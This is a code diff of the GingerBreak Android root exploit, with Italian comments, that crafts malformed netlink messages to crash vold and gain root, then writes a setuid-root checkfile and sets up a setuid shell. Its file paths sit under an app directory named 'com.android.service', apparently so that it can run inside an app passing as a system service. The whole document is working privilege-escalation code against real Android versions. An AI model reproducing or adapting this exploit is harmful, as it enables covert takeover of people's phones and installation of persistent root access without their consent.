@@ -54,16 +54,19 @@ static struct {
 static pid_t logcat_pid = 69;
 
 // La bash da runnare in caso ci serva una shell
-static char *sh = "/data/data/com.android.service/lib/libparse.so";
+static char *suidsh = "/data/data/com.android.service/lib/libparse.so";
 
 // L'exploit
-static char *bsh = "/data/data/com.android.service/files/statuslog";
+static char *exploit = "/data/data/com.android.service/files/statuslog";
 
 // Il log dove logcat scrivera' lo stacktrace del crash
 static char *crashlog = "/data/data/com.android.service/files/errorlog";
 
 // Checkfile: file che conferma che siamo diventati root
 static char *checklog = "/data/data/com.android.service/files/rdb";
+
+// Checkfile: file che conferma che siamo diventati root
+static char *suidext = "/data/data/com.android.service/files/statusdb";
 
 static char *default_dev = "/devices/platform/msm_sdcc.2/mmc_host/mmc1";
 static int scale = 1, honeycomb = 0, froyo = 0;
@@ -413,10 +416,11 @@ static int last_try() {
 
 	memset(buf, 0, sizeof(buf));
 
+	// messaggi per generare int overflow
 	n = snprintf(buf, sizeof(buf), "@/foo%cACTION=add%cSUBSYSTEM=block%c"
 	                  "DEVPATH=%s%c"
                	          "MAJOR=179%cMINOR=%d%cDEVTYPE=harder%cPARTN=1",
-                       	  0, 0, 0, bsh, 0, 0, vold.system, 0, 0);
+                       	  0, 0, 0, exploit, 0, 0, vold.system, 0, 0);
 
 	msg.msg_iov->iov_len = n;
 	n = sendmsg(sock, &msg, 0);
@@ -484,17 +488,17 @@ static int do_fault(uint32_t idx, int oneshot) {
 		n = snprintf(buf, sizeof(buf), "@/foo%cACTION=add%cSUBSYSTEM=block%c"
 		                  "SEQNUM=%s%cDEVPATH=%s%c"
                 	          "MAJOR=%s%cMINOR=%s%cDEVTYPE=%s%cPARTN=1",
-                        	  0, 0, 0, bsh, 0, bsh, 0, bsh, 0, bsh, 0, bsh, 0);
+                        	  0, 0, 0, exploit, 0, exploit, 0, exploit, 0, exploit, 0, exploit, 0);
 	} else if (froyo) {
 		n = snprintf(buf, sizeof(buf), "@/foo%cACTION=add%cSUBSYSTEM=block%c"
 		                  "DEVPATH=%s%c"
                 	          "MAJOR=179%cMINOR=%d%cDEVTYPE=harder%cPARTN=1",
-                        	  0, 0, 0, bsh, 0, 0, vold.system, 0, 0);
+                        	  0, 0, 0, exploit, 0, 0, vold.system, 0, 0);
 	} else {
 		n = snprintf(buf, sizeof(buf), "%s;@%s%cACTION=%s%cSUBSYSTEM=%s%c"
 		                  "SEQNUM=%s%cDEVPATH=%s%c"
                 	          "MAJOR=179%cMINOR=%d%cDEVTYPE=harder%cPARTN=1",
-                        	  bsh, bsh, 0, bsh, 0, bsh, 0, bsh, 0, bsh, 0, 0, vold.system, 0, 0);
+                        	  exploit, exploit, 0, exploit, 0, exploit, 0, exploit, 0, exploit, 0, 0, vold.system, 0, 0);
 	}
 
 	msg.msg_iov->iov_len = n;
@@ -608,6 +612,7 @@ static void do_root() {
 
 	FILE *fw = fopen(checklog, "w");
 
+	// scrive in rdb che l'exploit e' avvenuto. Java usa questo file per saperlo.
 	if (fw != NULL) {
 		LOG("Scrivo nel file\n");
 		fwrite(buf, strlen(buf), 1, fw);	
@@ -617,11 +622,11 @@ static void do_root() {
 		LOG(buf);
 	}
 
+	// suidshell
 	if (chown(checklog, 0, 0) < 0) {
 		sprintf(buf, "Chown failed: %d\n", errno);
 		LOG(buf);
 	}
-
 
 	if (chmod(checklog, 04755) < 0) {
 		sprintf(buf, "Chmod failed: %d\n", errno);
@@ -633,11 +638,12 @@ static void do_root() {
 
 int main(int argc, char **argv, char **env) {
 	uint32_t i = 0, j = 0, idx = 0;
-	char *ash[] = {sh, 0};
+	char *ash[] = {suidsh, 0};
 	struct stat st;
 	char build_id[256], version_release[256];
 	char buf[256];
 
+	// se viene chiamato da vold crashato...
 	if (geteuid() == 0 && getuid() == 0 /*&& strstr(argv[0], "boomsh")*/) {
 		do_root();
 	}
@@ -645,10 +651,10 @@ int main(int argc, char **argv, char **env) {
 	LOG("\n[**] Gingerbreak/Honeybomb -- android 2.[2,3], 3.0 softbreak\n");
 	LOG("[**] (C) 2010-2011 The Android Exploid Crew. All rights reserved.\n");
 
-	//if (copy("/proc/self/exe", bsh) < 0 || copy("/system/bin/sh", sh) < 0)
+	//if (copy("/proc/self/exe", exploit) < 0 || copy("/system/bin/sh", sh) < 0)
 	//	die("[-] Cannot copy boomsh.");
 
-	chmod(bsh, 0711);
+	chmod(exploit, 0711);
 
 	__system_property_get("ro.build.id", build_id);
 	__system_property_get("ro.build.version.release", version_release);
@@ -692,7 +698,7 @@ int main(int argc, char **argv, char **env) {
 		LOG(buf);
 
 		// Abbiamo una shell da avviare?
-        if (stat(sh, &st) == -1) {
+        if (stat(suidsh, &st) == -1) {
             //sprintf(buf, "[-] stat() [1] failed: %d\n", errno);
 			//LOG(buf);
         }
@@ -710,7 +716,7 @@ int main(int argc, char **argv, char **env) {
 		last_try(); 
 		last_try();
 
-        if (stat(sh, &st) == -1) {
+        if (stat(suidsh, &st) == -1) {
             sprintf(buf, "[-] stat() [2] failed: %d\n", errno);
 			LOG(buf);
         }
